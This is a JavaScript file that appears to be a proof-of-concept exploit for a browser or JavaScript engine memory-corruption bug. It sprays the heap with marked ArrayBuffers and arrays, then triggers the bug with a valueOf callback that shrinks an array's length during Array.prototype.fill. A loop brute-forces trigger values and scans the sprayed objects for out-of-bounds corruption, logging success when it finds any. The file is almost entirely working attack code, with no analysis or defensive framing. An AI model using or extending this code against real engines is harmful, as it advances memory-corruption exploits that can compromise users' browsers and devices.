import { log, sleep } from './module/utils.mjs';

const MARK = 0x42424242;

function massiveSpray() {
    const objects = [];
    
    for (let i = 0; i < 800; i++) {
        const buffer = new ArrayBuffer(0x4000);
        const view = new Uint32Array(buffer);
        view[0] = MARK;
        view[1] = i;
        objects.push(buffer);
    }
    
    for (let i = 0; i < 400; i++) {
        const arr = new Array(80);
        for (let j = 0; j < arr.length; j++) {
            arr[j] = {
                marker: MARK,
                index: i,
                data: new ArrayBuffer(32)
            };
        }
        objects.push(arr);
    }
    
    for (let i = 0; i < 200; i++) {
        const typed = new Uint8Array(0x1000);
        typed[0] = 0x42;
        typed[1] = 0x42;
        typed[2] = 0x42;
        typed[3] = 0x42;
        objects.push(typed.buffer);
    }
    
    return objects;
}

function trigger(returnVal) {
    const v0 = [];
    for (let i = 0; i < 30000; i++) {
        v0[i] = {
            tag: 0xdead,
            idx: i,
            buf: new ArrayBuffer(32),
            arr: [1, 2, 3]
        };
    }
    const v10 = new Object(Object, v0);

    function f11() {
        v0.length = 0;
        return returnVal;
    }
    const o14 = { valueOf: f11 };

    try {
        v0.fill(v10, o14);
    } catch (e) {}
}

function check(sprayedObjects) {
    let corrupted = 0;
    
    for (let i = 0; i < sprayedObjects.length; i++) {
        const obj = sprayedObjects[i];
        
        if (obj instanceof ArrayBuffer) {
            const view = new Uint32Array(obj);
            if (view[0] !== MARK && view[0] !== 0) {
                log("Buffer corrupted at " + i + " value " + view[0].toString(16));
                corrupted++;
            }
        }
        
        else if (Array.isArray(obj)) {
            for (let j = obj.length; j < obj.length + 15; j++) {
                if (obj[j] !== undefined && obj[j].marker === MARK) {
                    log("Array OOB at " + i + " index " + j);
                    corrupted++;
                }
            }
        }
    }
    
    return corrupted;
}

async function main() {
    const values = [];
    for (let i = -1000; i <= 1000; i++) {
        values.push(i);
    }
    
    for (const returnValue of values) {
        log("Testing value: " + returnValue);
        
        const sprayedObjects = massiveSpray();
        await sleep(5);
        
        trigger(returnValue);
        await sleep(2);
        
        const corrupted = check(sprayedObjects);
        if (corrupted > 0) {
            log("SUCCESS with value: " + returnValue);
            break;
        }
        
        if (returnValue % 100 === 0) {
            log("Progress: " + returnValue);
        }
    }
    
    log("done");
}

main();